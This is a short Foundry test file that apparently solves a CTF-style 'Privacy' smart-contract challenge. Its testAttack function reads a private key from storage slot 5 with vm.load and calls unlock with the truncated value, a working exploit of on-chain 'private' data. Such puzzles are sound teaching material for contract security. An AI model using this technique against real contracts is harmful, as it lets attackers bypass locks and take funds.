// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {Privacy} from "../src/Privacy.sol";

contract PrivacyTest is Test {
    Privacy public privacy;

    function setUp() public {
        bytes32 hello = "hello";
        bytes32 world = "world";
        bytes32 moon = "moon";
        bytes32[3] memory _data = [hello, world, moon];
        privacy = new Privacy(_data);
    }

    function testAttack() public {
        assertEq(privacy.locked(), true);
        // in slot5
        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));
        privacy.unlock(bytes16(key));
        assertEq(privacy.locked(), false);
    }
}
